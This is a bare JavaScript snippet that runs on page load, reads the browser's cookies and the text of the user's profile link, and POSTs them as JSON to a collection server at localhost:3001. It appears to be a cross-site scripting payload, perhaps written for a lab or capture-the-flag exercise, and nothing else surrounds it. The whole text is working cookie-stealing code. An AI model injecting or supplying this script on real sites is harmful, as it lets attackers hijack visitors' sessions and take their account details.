window.addEventListener('DOMContentLoaded', (event) => {
    fetch('http://localhost:3001/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            cookies: document.cookie,
            name: document.querySelector('a[href="./profile.php"]').innerHTML
        })
    })
});